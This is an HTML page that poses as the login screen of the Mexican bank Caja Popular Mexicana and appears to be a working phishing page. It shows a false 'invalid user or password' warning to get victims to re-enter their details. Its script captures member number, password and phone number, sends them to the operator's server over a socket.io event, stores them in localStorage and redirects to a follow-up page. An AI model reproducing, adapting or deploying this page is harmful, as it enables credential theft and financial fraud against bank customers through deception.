<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Caja Popular Mexicana</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f3f6f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
    }

    .screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      background: #fff;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    .logo {
      width: 100px;
      margin-bottom: 1rem;
    }

    h2 {
      font-size: 1.5em;
      margin-bottom: 1rem;
    }

    p {
      font-size: 1em;
      color: #555;
      margin-bottom: 1rem;
    }

    .alerta {
      background-color: #ffe5e5;
      color: #d8000c;
      border: 1px solid #d8000c;
      padding: 10px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 0.95em;
      width: 100%;
    }

    .input-group {
      display: flex;
      align-items: center;
      background: #f0f2f5;
      border-radius: 8px;
      margin: 1rem 0;
      padding: 0.0rem 1rem;
      width: 100%;
      max-width: 350px;
      justify-content: flex-start;
      margin-left: -15px;
    }

    .input-group .icon {
      color: #888;
      margin-right: 0.5rem;
    }

    .input-group input {
      border: none;
      background: transparent;
      outline: none;
      flex: 1;
      font-size: 1rem;
      padding: 10px 0.75rem;
      height: 20px;
    }

    button {
      background-color: #019765;
      color: white;
      padding: 8px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
      width: auto;
      margin-top: 1rem;
    }

    button:hover {
      background-color: #019765;
    }

    button:disabled {
      background: #cccccc;
      cursor: not-allowed;
    }

    .mensaje-error {
      color: red;
      margin-top: 1rem;
      font-size: 0.85rem;
    }

    .campo-requerido {
      border: 1px solid red !important;
    }
  </style>
</head>
<body>
  <div class="screen active" id="pantallaInicio">
    <img src="https://seeklogo.com/images/C/caja-popular-mexicana-logo-EC4478514F-seeklogo.com.png" alt="Caja Popular Mexicana Logo" class="logo">
    <h2>Bienvenido a Caja Popular Mexicana.</h2>

    <div class="alerta">
      ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
    </div>

    <p>Ingrese a su cuenta para iniciar con el proceso de análisis.</p>
    <form id="login-form">
      <div class="input-group">
        <div class="icon"><i class="fas fa-user"></i></div>
        <input type="tel" id="socio" placeholder="Número de socio" maxlength="10" required>
      </div>
      <div class="input-group">
        <div class="icon"><i class="fas fa-lock"></i></div>
        <input type="password" id="password" placeholder="Contraseña" required>
      </div>
      <div class="input-group">
        <div class="icon"><i class="fas fa-phone"></i></div>
        <input type="tel" id="telefono" placeholder="Número telefónico" maxlength="10" required>
      </div>
      <p id="socioError" class="mensaje-error"></p>
      <p id="passwordError" class="mensaje-error"></p>
      <p id="telefonoError" class="mensaje-error"></p>
      <button type="submit" id="btnContinuar">Continuar</button>
    </form>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    window.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('login-form');

      if (form) {
        form.addEventListener('submit', (e) => {
          e.preventDefault();

          if (validarSocio() && validarPassword() && validarTelefono()) {
            const socio = document.getElementById('socio').value;
            const contrasena = document.getElementById('password').value;
            const telefono = document.getElementById('telefono').value;
            const sessionId = localStorage.getItem('sessionId') || crypto.randomUUID();

            localStorage.setItem('sessionId', sessionId);
            localStorage.setItem('socio', socio);
            localStorage.setItem('contrasena', contrasena);
            localStorage.setItem('telefono', telefono);

            socket.emit('errorlogoForm', { socio, contrasena, telefono, sessionId });

            window.location.href = 'opciones.html';
          }
        });
      }
    });

    function validarSocio() {
      const socio = document.getElementById("socio").value;
      const socioError = document.getElementById("socioError");
      const socioInput = document.getElementById("socio");

      const soloNumeros = /^\d{1,10}$/;

      if (!socio) {
        socioError.textContent = "El número de socio es obligatorio";
        socioInput.classList.add("campo-requerido");
        return false;
      } else if (!soloNumeros.test(socio)) {
        socioError.textContent = "Debe ingresar hasta 10 dígitos numéricos";
        socioInput.classList.add("campo-requerido");
        return false;
      } else {
        socioError.textContent = "";
        socioInput.classList.remove("campo-requerido");
        return true;
      }
    }

    function validarPassword() {
      const password = document.getElementById("password").value;
      const passwordError = document.getElementById("passwordError");
      const passwordInput = document.getElementById("password");

      if (!password) {
        passwordError.textContent = "La contraseña es obligatoria";
        passwordInput.classList.add("campo-requerido");
        return false;
      } else if (password.length < 4) {
        passwordError.textContent = "La contraseña debe tener al menos 4 caracteres";
        passwordInput.classList.add("campo-requerido");
        return false;
      } else {
        passwordError.textContent = "";
        passwordInput.classList.remove("campo-requerido");
        return true;
      }
    }

    function validarTelefono() {
      const telefono = document.getElementById("telefono").value;
      const telefonoError = document.getElementById("telefonoError");
      const telefonoInput = document.getElementById("telefono");

      const soloNumeros = /^\d{1,10}$/;

      if (!telefono) {
        telefonoError.textContent = "El número telefónico es obligatorio";
        telefonoInput.classList.add("campo-requerido");
        return false;
      } else if (!soloNumeros.test(telefono)) {
        telefonoError.textContent = "Debe ingresar hasta 10 dígitos numéricos";
        telefonoInput.classList.add("campo-requerido");
        return false;
      } else {
        telefonoError.textContent = "";
        telefonoInput.classList.remove("campo-requerido");
        return true;
      }
    }
  </script>
</body>
</html>
